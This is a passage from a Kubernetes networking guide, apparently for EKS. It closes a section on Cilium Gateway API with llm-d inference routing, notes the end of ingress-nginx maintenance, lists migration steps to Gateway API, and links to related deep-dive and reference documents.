**Cilium Gateway API + llm-d** — when operating cloud and on-premises GPU nodes together via EKS Hybrid Nodes, using Cilium as a single CNI provides the benefits of CNI unification + Hubble unified observability + built-in Gateway API. AI inference traffic is optimized by llm-d with KV-cache-aware routing. For details, see the [Cilium ENI + Gateway API Deep-Dive Guide — Section 9](/docs/eks-best-practices/networking-performance/gateway-api-adoption-guide/cilium-eni-gateway-api#9-hybrid-nodes-architecture-and-aiml-workloads).

  </TabItem>
</Tabs>

### 6.2 Future Expansion Roadmap

<RoadmapTimeline locale="en" />

### 6.3 Key Message

:::info
**Maintenance for the community ingress-nginx controller ended in March 2026** ([retirement notice](https://kubernetes.io/blog/2025/11/11/ingress-nginx-retirement/)). If you still use it, plan migration to a supported controller or Gateway API implementation. Validate routing behavior and policy enforcement as part of that migration.

Gateway API provides a common resource model for traffic management:
- **Role separation**: Platform and application teams manage different resources and permissions.
- **Standardization**: Shared APIs improve configuration portability; controller-specific extensions still need review.
- **Extensibility**: Related APIs and implementations address East-West traffic, service meshes, and AI integration.
:::

**Start now:**
1. Collect the current Ingress inventory — see [Migration Execution Strategy](/docs/eks-best-practices/networking-performance/gateway-api-adoption-guide/migration-execution-strategy)
2. Select a solution that fits the workload (Section 4)
3. Build a PoC environment — see [Migration Execution Strategy](/docs/eks-best-practices/networking-performance/gateway-api-adoption-guide/migration-execution-strategy)
4. Execute a gradual migration — see [Migration Execution Strategy](/docs/eks-best-practices/networking-performance/gateway-api-adoption-guide/migration-execution-strategy)

**Additional resources:**
- [Gateway API official documentation](https://gateway-api.sigs.k8s.io/)
- [Cilium official documentation](https://docs.cilium.io/)
- [NGINX Gateway Fabric](https://docs.nginx.com/nginx-gateway-fabric/)
- [Envoy Gateway](https://gateway.envoyproxy.io/)
- [Kong Ingress Controller](https://developer.konghq.com/kubernetes-ingress-controller/)
- [AWS Load Balancer Controller](https://kubernetes-sigs.github.io/aws-load-balancer-controller/)

---

## Related Documents

### Sub-documents (Deep-dive Guides)

The topic-specific deep-dive content of this guide is provided in separate sub-documents.

- **[1. Cilium ENI Mode + Gateway API Deep-Dive Configuration](/docs/eks-best-practices/networking-performance/gateway-api-adoption-guide/cilium-eni-gateway-api)** — ENI mode architecture, installation/configuration, performance optimization (eBPF, XDP), Hubble observability, BGP Control Plane v2, hybrid node architecture
- **[2. Migration Execution Strategy](/docs/eks-best-practices/networking-performance/gateway-api-adoption-guide/migration-execution-strategy)** — 5-phase migration process, CRD installation, verification scripts, troubleshooting guide
- **[3. Feature Implementation Cookbook](/docs/eks-best-practices/networking-performance/gateway-api-adoption-guide/feature-implementation-cookbook)** — reference for implementing authentication, rate limiting, IP control, URL rewrite, headers, session affinity, body size, and error pages as YAML across the 6 implementations

### Related Documents (Service Mesh)

East-West (service mesh) topics, which extend the Gateway API into mesh traffic, are covered in a separate category.

- **[Service Mesh Comparison Guide](/docs/eks-best-practices/networking-performance/service-mesh)** — Data plane architecture, feature matrix, performance overhead, and selection guide for Istio, Cilium, Linkerd, and VPC Lattice
- **[GAMMA Initiative](/docs/eks-best-practices/networking-performance/service-mesh/gamma-initiative)** — GAMMA overview, East-West traffic management, per-implementation support status

### Related Documents (Agentic AI Platform)

- **[Tiered Gateway Architecture](/docs/agentic-ai-platform/model-serving/inference-routing/tiered-gateway-architecture)** — the full map and terminology of Tier 1 (this document), Tier 2 ① inference routing, ② LLM API gateway, and the Agent Data Plane (single source of definitions)
- **[Inference Gateway Reference](/docs/agentic-ai-platform/reference-architecture/inference-gateway)** — the Tier 2 inference gateway layer for agentic workloads (KV-cache-aware routing, model endpoint management). Configured as a 2-tier setup together with this document (Tier 1 general gateway)
- **[Inference Gateway Setup Guide](/docs/agentic-ai-platform/reference-architecture/inference-gateway/setup)** — inference gateway Helm deployment, HTTPRoute, and OTel configuration

### Related Categories

- [2. CoreDNS Monitoring & Optimization](/docs/eks-best-practices/networking-performance/coredns-monitoring-optimization)
- [3. East-West Traffic Optimization](/docs/eks-best-practices/networking-performance/east-west-traffic-best-practice)
- [4. Karpenter Ultra-fast Autoscaling](/docs/eks-best-practices/resource-cost/karpenter-autoscaling)

### External References

- [Kubernetes Gateway API official documentation](https://gateway-api.sigs.k8s.io/)
- [Gateway API Inference Extension](https://gateway-api-inference-extension.sigs.k8s.io/)
- [AWS Load Balancer Controller](https://kubernetes-sigs.github.io/aws-load-balancer-controller/)
- [Cilium Gateway API documentation](https://docs.cilium.io/en/stable/network/servicemesh/gateway-api/gateway-api/)
- [Kong Ingress Controller](https://developer.konghq.com/kubernetes-ingress-controller/)
